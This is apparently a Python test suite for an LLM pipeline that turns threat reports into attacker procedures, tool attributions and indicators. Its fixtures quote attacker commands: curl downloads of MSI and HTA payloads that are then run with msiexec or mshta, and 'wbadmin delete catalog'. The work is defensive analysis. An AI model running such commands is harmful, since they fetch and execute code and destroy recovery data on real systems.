        kept = _ground_command_lines([self.CMD], self._chunk(), self.PARSED, [], "p")
        assert kept == [self.CMD]

    def test_grounding_survives_ocr_noise_but_not_analogs(self, caplog):
        """Real output from an espionage-RAT report: the figure transcription read `cur1`; the
        model returned `curl`. An invented flag and a command built by
        analogy from a different filename must still be dropped."""
        from app.nodes.llm.drafting import _ground_command_lines

        source = (
            "server: Litespeed cur1 -o c:\\users\\public\\music\\setup.msi "
            "http://files.example.net/setup.msi msiexec /i "
            "c:\\users\\public\\music\\setup.msi /qn/norestart ``` First payload"
        )
        real = "curl -o c:\\users\\public\\music\\setup.msi http://files.example.net/setup.msi"
        flagged = "curl -s -k -o c:\\users\\public\\music\\setup.msi http://files.example.net/setup.msi"
        analog = "curl -o c:\\users\\public\\music\\update.msi http://files.example.net/update.msi"
        with caplog.at_level("INFO", logger="app.nodes.llm.drafting"):
            kept = _ground_command_lines(
                [real, flagged, analog], {"text": ""}, source, [], "Install WmRAT",
            )
        assert kept == [real]
        assert "near match" in caplog.text

    def test_grounding_is_refang_aware(self):
        """The source defangs the URL inside the command; the model may
        return it fanged. Both sides are refanged before comparison."""
        from app.nodes.llm.drafting import _ground_command_lines

        source = "curl -o C:\\users\\public\\music\\update[.]msi http://files.example[.]net/update[.]msi"
        fanged = "curl -o C:\\users\\public\\music\\update.msi http://files.example.net/update.msi"
        assert _ground_command_lines([fanged], {"text": ""}, source, [], "p") == [fanged]

    def test_grounding_falls_back_to_chunk_when_no_parsed_text(self):
        from app.nodes.llm.drafting import _ground_command_lines

        chunk = self._chunk(source_excerpt=f"They ran {self.CMD} first.")
        assert _ground_command_lines([self.CMD], chunk, "", [], "p") == [self.CMD]
        assert _ground_command_lines([self.CMD], self._chunk(), "", [], "p") == []

    @pytest.mark.asyncio
    @patch("app.nodes.llm.drafting.call_llm", new_callable=AsyncMock)
    async def test_node_keeps_only_grounded_commands(self, mock_call):
        from app.nodes.llm.drafting import draft_procedures

        mock_call.return_value = _mock_llm_response({
            "drafts": [{
                "chunk_id": "chk-vss",
                "name": "Delete Shadow Copies via vssadmin",
                "description": "Remove recovery points.",
                "platforms": ["windows"],
                "command_lines": [self.CMD, "wbadmin delete catalog -quiet"],
                "detail_gap": False,
            }],
        })
        state = {
            "chunks": [self._chunk(predecessor_indices=[], behavioral_confidence=0.9,
                                   branch_point=False, convergence_point=False,
                                   source_location={})],
            "technique_mappings": {"chk-vss": [
                {"technique_id": "T1490", "technique_name": "Inhibit System Recovery",
                 "tactic": "impact", "confidence": 0.9},
            ]},
            "validated_entities": self.ENTITIES,
            "metadata": {},
            "parsed_text": self.PARSED,
        }
        with patch("app.nodes.llm.drafting._fetch_feedback_addendum", new=AsyncMock(return_value="")), \
             patch("app.nodes.llm.drafting._fetch_feedback_examples", new=AsyncMock(return_value="")):
            result = await draft_procedures(state)

        assert result["drafts"][0]["raw_command_lines"] == [self.CMD]
        # And the model was shown the verbatim inputs it is told to copy from.
        sent = mock_call.call_args.kwargs["messages"][0]["content"]
        assert "SOURCE EXCERPT (verbatim)" in sent
        assert f"    - {self.CMD}" in sent


class TestToolsUsedEvidenceFilter:
    """Tool attribution must be evidenced by the chunk.

    These reach the bundle as real `uses` SROs — false tooling claims about a
    threat actor — unlike the Gate 2 preview's fan-out, which is display-only.
    """

    CHUNK = {
        "text": "The actor used curl.exe to download cont.hta; mshta executed it.",
        "source_excerpt": "",
    }
    RAW = {
        "name": "Download HTA Payload via curl.exe",
        "command_lines": ["curl -s -L -o cont.hta http://x/y"],
        "description": "Retrieve the payload.",
    }

    def test_evidenced_tools_survive(self):
        from app.nodes.llm.drafting import _filter_to_evidenced

        assert _filter_to_evidenced(
            ["curl", "mshta"], self.CHUNK, self.RAW, "tool",
        ) == ["curl", "mshta"]

    def test_unevidenced_tool_is_dropped(self):
        """PowerShell appears only in the report title, never in an event."""
        from app.nodes.llm.drafting import _filter_to_evidenced

        assert _filter_to_evidenced(
            ["PowerShell"], self.CHUNK, self.RAW, "tool",
        ) == []

    def test_command_lines_count_as_evidence(self):
        from app.nodes.llm.drafting import _filter_to_evidenced

        chunk = {"text": "The actor staged a payload.", "source_excerpt": ""}
        raw = {"name": "p", "command_lines": [r"tar -xf a.pdf -C C:\x"], "description": ""}
        assert _filter_to_evidenced(["tar"], chunk, raw, "tool") == ["tar"]

    def test_malware_named_in_the_chunk_is_kept(self):
        from app.nodes.llm.drafting import _filter_to_evidenced

        chunk = {
            "text": "The intrusion culminated in installation of NETSUPPORT.",
            "source_excerpt": "",
        }
        raw = {"name": "Install NETSUPPORT", "command_lines": [], "description": ""}
        assert _filter_to_evidenced(
            ["NETSUPPORT"], chunk, raw, "malware",
        ) == ["NETSUPPORT"]
        assert _filter_to_evidenced(["PowerShell"], chunk, raw, "tool") == []

    def test_blank_and_non_string_entries_are_ignored(self):
        from app.nodes.llm.drafting import _filter_to_evidenced

        assert _filter_to_evidenced(
            ["", "   ", None, 42], self.CHUNK, self.RAW, "tool",
        ) == []


class TestClassifySectionsNode:
    """classify_sections is its own node, upstream of entity extraction.

    It used to live inside chunk_behaviors, which is DOWNSTREAM of
    extract_entities — so entity extraction had no section labels available
    and mined the whole document, including remediation advice.
    """

    async def test_node_writes_sections_and_status(self):
        from app.nodes.llm.chunking import classify_sections

        with patch(
            "app.nodes.llm.chunking._classify_sections",
            new=AsyncMock(return_value=[{"section_id": "s1", "text": "x",
                                         "classification": "behavioral_narrative"}]),
        ):
            out = await classify_sections({"parsed_text": "some text"})
        assert out["classified_sections"][0]["section_id"] == "s1"
        assert out["current_node"] == "classify_sections"

    async def test_empty_parsed_text_does_not_raise(self):
        from app.nodes.llm.chunking import classify_sections

        out = await classify_sections({"parsed_text": ""})
        assert out["classified_sections"] == []

    async def test_chunker_reuses_sections_instead_of_reclassifying(self):
        """Re-classifying would spend an LLM call to recompute an identical
        answer, and would let the chunker and entity extraction disagree
        about the same document."""
        from app.nodes.llm.chunking import chunk_behaviors

        sections = [{
            "section_id": "s1", "text": "The actor ran certutil.",
            "classification": "behavioral_narrative",
            "source_location": {"start_line": 1, "end_line": 1},
        }]
        with patch(
            "app.nodes.llm.chunking._classify_sections", new=AsyncMock(),
        ) as reclassify, patch(
            "app.nodes.llm.chunking.call_llm", new=AsyncMock(),
        ) as call:
            call.return_value = _mock_llm_response({"chunks": []})
            await chunk_behaviors({
                "parsed_text": "The actor ran certutil.",
                "classified_sections": sections,
                "validated_entities": [], "metadata": {},
            })
        reclassify.assert_not_awaited()


class TestEntityExtractionSectionFilter:
    """Entity extraction skips sections that are not about the adversary."""

    def test_remediation_and_detection_sections_are_excluded(self):
        from app.nodes.llm.entity_extraction import _text_for_entity_extraction

        state = {
            "parsed_text": "irrelevant",
            "classified_sections": [
                {"text": "The actor used curl.exe.",
                 "classification": "behavioral_narrative"},
                {"text": "Deploy Microsoft Defender and SmartScreen.",
                 "classification": "detection_logic"},
                {"text": "T1059 Command and Scripting Interpreter",
                 "classification": "technique_reference"},
            ],
        }
        text = _text_for_entity_extraction(state)
        assert "curl.exe" in text
        # The six defensive products on one campaign source came from here.
        assert "Defender" not in text
        assert "T1059" not in text

    def test_indicator_data_sections_are_kept(self):
        """A hunting list of artifacts is indicator_data and must reach the
        extractor. One report's mutex and registry key lived only in such a
        list; misfiled as detection_logic they were dropped here and came
        back as AI-reviewer adds at Gate 0."""
        from app.nodes.llm.entity_extraction import _text_for_entity_extraction

        state = {
            "parsed_text": "irrelevant",
            "classified_sections": [
                {"text": "The actor used curl.exe.",
                 "classification": "behavioral_narrative"},
                {"text": ("- Mutex named Dataupcheckinfo\n"
                          "- Registry writes to HKCU\\SOFTWARE\\Classes\\CLSID"
                          "\\{...}\\InprocServer32 for persistence"),
                 "classification": "indicator_data"},
            ],
        }
        text = _text_for_entity_extraction(state)
        assert "Dataupcheckinfo" in text
        assert "InprocServer32" in text

    def test_metadata_sections_are_kept_for_provenance(self):
        """Footers look like boilerplate but carry the publisher.

        Excluding `metadata` dropped "Google" as publisher on one campaign report —
        caught only in end-to-end validation, with the unit tests green.
        """
        from app.nodes.llm.entity_extraction import _text_for_entity_extraction

        state = {
            "parsed_text": "x",
            "classified_sections": [
                {"text": "Confidential and Proprietary / Copyright 2026 Google.",
                 "classification": "metadata"},
            ],
        }
        assert "Google" in _text_for_entity_extraction(state)

    def test_contextual_sections_are_kept(self):
        """Contextual text still names actors, victims and locations."""
        from app.nodes.llm.entity_extraction import _text_for_entity_extraction

        state = {
            "parsed_text": "x",
            "classified_sections": [
                {"text": "UNC0001 targets organizations in the UK.",
                 "classification": "contextual"},
            ],
        }
        assert "UNC0001" in _text_for_entity_extraction(state)

    def test_falls_back_to_full_text_when_nothing_survives(self):
        """An empty string here hard-fails the source."""
        from app.nodes.llm.entity_extraction import _text_for_entity_extraction

        state = {
            "parsed_text": "the whole document",
            "classified_sections": [
                {"text": "rules", "classification": "detection_logic"},
            ],
        }
        assert _text_for_entity_extraction(state) == "the whole document"

    def test_falls_back_when_there_are_no_sections(self):
        from app.nodes.llm.entity_extraction import _text_for_entity_extraction

        assert _text_for_entity_extraction(
            {"parsed_text": "doc", "classified_sections": []},
        ) == "doc"


class TestEntityQualityBackstops:
    """Placeholder, victim-side and low-confidence guards.

    All three were found on one campaign source, where 13 of 45 entities
    needed analyst correction — a 29% error rate against 3% on the report the
    prompts were tuned against.
    """

    def test_subdomain_placeholder_is_stripped_to_the_real_domain(self):
        from app.nodes.llm.entity_extraction import _normalize_placeholder_value

        # The report prints the harvesting domains as a naming PATTERN; the
        # registrable domain is the actionable indicator.
        assert _normalize_placeholder_value(
            "<organization>.enrollms.com", "ioc_domain",
        ) == "enrollms.com"

    def test_wholly_placeholder_value_is_rejected(self):
        from app.nodes.llm.entity_extraction import _normalize_placeholder_value

        assert _normalize_placeholder_value("[COMPANY NAME]", "ioc_domain") is None

    def test_real_indicator_is_untouched(self):
        from app.nodes.llm.entity_extraction import _normalize_placeholder_value

        assert _normalize_placeholder_value(
            "poqwserty.com", "ioc_domain",
        ) == "poqwserty.com"

    def test_non_ioc_types_may_contain_brackets(self):
        """Actor and campaign names legitimately carry brackets."""
        from app.nodes.llm.entity_extraction import _normalize_placeholder_value

        assert _normalize_placeholder_value(
            "Campaign <redacted>", "campaign",
        ) == "Campaign <redacted>"

    def test_victim_mailbox_is_not_an_indicator(self):
        from app.nodes.llm.entity_extraction import _is_victim_side_identifier

        assert _is_victim_side_identifier(
            "victim.user@organization.com", "ioc_email",
        )

    def test_attacker_address_is_kept(self):
        from app.nodes.llm.entity_extraction import _is_victim_side_identifier

        assert not _is_victim_side_identifier("attacker@evil.ru", "ioc_email")

    def test_placeholders_and_victim_ids_are_dropped_end_to_end(self):
        from app.nodes.llm.entity_extraction import _process_entities

        out = _process_entities([
            {"entity_type": "ioc_domain", "value": "<organization>.passkeyms[.]com",
             "confidence": 0.9},
            {"entity_type": "ioc_email", "value": "victim.user@company.com",
             "confidence": 1.0},
            {"entity_type": "ioc_domain", "value": "poqwserty[.]com",
             "confidence": 1.0},
        ])
        values = {e["value"] for e in out}
        assert values == {"passkeyms.com", "poqwserty.com"}

    def test_low_confidence_entity_is_flagged(self):
        from app.nodes.llm.entity_extraction import _process_entities

        out = _process_entities([
            {"entity_type": "victim_sector", "value": "financial-services",
             "confidence": 0.3},
            {"entity_type": "intrusion_set", "value": "UNC0001", "confidence": 1.0},
        ])
        flagged = {e["value"]: e.get("low_confidence", False) for e in out}
        assert flagged["financial-services"] is True
        assert flagged["UNC0001"] is False


class TestPlatformMismatchDemotion:
    """Platform-inappropriate techniques go to the review lane.

    T1553.001 Gatekeeper Bypass is macOS-only and surfaced for a Windows
    SSL-revocation bypass. The bucket system contained it, but it crowded out
    the applicable parent, which never became a candidate at all.
    """

    CATALOGUE = {
        "T1553.001": {"platforms": ["macOS"]},
        "T1553": {"platforms": ["Linux", "macOS", "Windows"]},
        "T1105": {"platforms": []},
    }

    def test_windows_source_is_detected(self):
        from app.nodes.llm.technique_extraction import _detect_source_platforms

        chunks = [{"text": r"Modified HKEY_CURRENT_USER RunMRU, ran curl.exe -o C:\a.hta"}]
        assert "Windows" in _detect_source_platforms(chunks)

    def test_identity_and_office_source_is_detected(self):
        from app.nodes.llm.technique_extraction import _detect_source_platforms

        chunks = [{"text": "Used SSO and Okta to reach SharePoint and OneDrive."}]
        found = _detect_source_platforms(chunks)
        assert "Identity Provider" in found and "Office Suite" in found

    def test_no_signal_returns_empty(self):
        """Absence must mean 'do not filter', never 'filter everything'."""
        from app.nodes.llm.technique_extraction import _detect_source_platforms

        assert _detect_source_platforms([{"text": "The actor did something."}]) == set()

    def test_mismatched_pick_is_demoted_not_dropped(self):
        from app.nodes.llm.technique_extraction import _demote_platform_mismatches

        picks = [{"technique_id": "T1553.001",
                  "confidence_bucket": "probable", "confidence": 0.8}]
        out = _demote_platform_mismatches(picks, {"Windows"}, self.CATALOGUE)
        assert out[0]["confidence_bucket"] == "possible"
        assert out[0]["platform_mismatch"] is True
        assert len(out) == 1, "demote, never drop — the analyst can promote"

    def test_matching_pick_is_untouched(self):
        from app.nodes.llm.technique_extraction import _demote_platform_mismatches

        picks = [{"technique_id": "T1553",
                  "confidence_bucket": "definite", "confidence": 0.9}]
        out = _demote_platform_mismatches(picks, {"Windows"}, self.CATALOGUE)
        assert out[0]["confidence_bucket"] == "definite"

    def test_technique_without_platform_metadata_is_untouched(self):
        """Incomplete metadata must not cost a correct pick."""
        from app.nodes.llm.technique_extraction import _demote_platform_mismatches

        picks = [{"technique_id": "T1105",
                  "confidence_bucket": "definite", "confidence": 0.95}]
        out = _demote_platform_mismatches(picks, {"Windows"}, self.CATALOGUE)
        assert out[0]["confidence_bucket"] == "definite"

    def test_unknown_source_platforms_disables_the_check(self):
        from app.nodes.llm.technique_extraction import _demote_platform_mismatches

        picks = [{"technique_id": "T1553.001",
                  "confidence_bucket": "definite", "confidence": 0.9}]
        out = _demote_platform_mismatches(picks, set(), self.CATALOGUE)
        assert out[0]["confidence_bucket"] == "definite"


class TestChunkContextToleratesUnknownKeys:
    """One unrecognised context key must not cost a whole chunking pass.

    On a ransomware run, chunk 9 of 16 carried `target_software` instead of
    `target`. ChunkContext was strict, so the batch was rejected, the retry
    returned a malformed payload, and the run failed at chunking having
    already produced sixteen good chunks. `artifacts` right beside it has
    always tolerated new categories; context is the same kind of metadata.
    """

    def test_unknown_key_is_dropped_not_fatal(self):
        from app.nodes.llm.tool_models import ChunkContext

        ctx = ChunkContext.model_validate({
            "actor": "Water Bakunawa",
            "target_software": "Example AV",
            "tactics": ["defense-evasion"],
        })
        assert ctx.actor == "Water Bakunawa"
        assert ctx.tactics == ["defense-evasion"]
        assert not hasattr(ctx, "target_software"), "unknown keys are dropped"

    def test_the_dropped_key_is_logged(self, caplog):
        """Drift between prompt and model must stay visible."""
        import logging

        from app.nodes.llm.tool_models import ChunkContext

        with caplog.at_level(logging.INFO, logger="app.nodes.llm.tool_models"):
            ChunkContext.model_validate({"actor": "x", "target_software": "y"})
        assert "target_software" in caplog.text

    def test_a_whole_chunk_survives_the_unknown_key(self):
        """The failure was at batch level, so pin it at batch level."""
        from app.nodes.llm.tool_models import ChunkBehaviorsOutput

        out = ChunkBehaviorsOutput.model_validate({"chunks": [
            {"text": "a", "sequence_index": 1, "behavioral_confidence": 0.9,
             "context": {"actor": "x", "tactics": ["impact"]}},
            {"text": "b", "sequence_index": 2, "behavioral_confidence": 0.9,
             "context": {"actor": "x", "target_software": "EDR"}},
        ]})
        assert len(out.chunks) == 2, "one odd key must not drop the batch"


class TestTrailingJunkIsRecovered:
    """A valid JSON array with a stray trailing brace must still parse.

    The other half of the same failure: the retry emitted a well-formed
    16-element array followed by one '}'. json.loads refuses the entire
    string on "Extra data"; raw_decode takes the valid prefix.
    """

    def test_trailing_brace_is_discarded(self):
        import json

        from app.nodes.llm.llm_adapter import _coerce_json_string_fields
        from app.nodes.llm.tool_models import ChunkBehaviorsOutput

        payload = json.dumps([
            {"text": "a", "sequence_index": 1, "behavioral_confidence": 0.9},
        ]) + "}"
        out = _coerce_json_string_fields(
            {"chunks": payload}, ChunkBehaviorsOutput,
        )
        assert isinstance(out["chunks"], list)
        assert len(out["chunks"]) == 1

    def test_the_discard_is_logged_with_its_size(self, caplog):
        import json
        import logging

        from app.nodes.llm.llm_adapter import _coerce_json_string_fields
        from app.nodes.llm.tool_models import ChunkBehaviorsOutput

        payload = json.dumps([{"text": "a"}]) + "}}}"
        with caplog.at_level(logging.WARNING, logger="app.nodes.llm.llm_adapter"):
            _coerce_json_string_fields({"chunks": payload}, ChunkBehaviorsOutput)
        assert "coerce_truncated" in caplog.text
        assert "3 trailing" in caplog.text, "the size must be reported"

    def test_clean_json_is_untouched(self):
        import json

        from app.nodes.llm.llm_adapter import _coerce_json_string_fields
        from app.nodes.llm.tool_models import ChunkBehaviorsOutput

        payload = json.dumps([{"text": "a"}])
        out = _coerce_json_string_fields({"chunks": payload}, ChunkBehaviorsOutput)
        assert out["chunks"] == [{"text": "a"}]

    def test_unrecoverable_json_still_skips(self):
        """Genuine garbage must not be forced through."""
        from app.nodes.llm.llm_adapter import _coerce_json_string_fields
        from app.nodes.llm.tool_models import ChunkBehaviorsOutput

        out = _coerce_json_string_fields(
            {"chunks": "[{not json at all"}, ChunkBehaviorsOutput,
        )
        assert out["chunks"] == "[{not json at all", "left for the retry path"
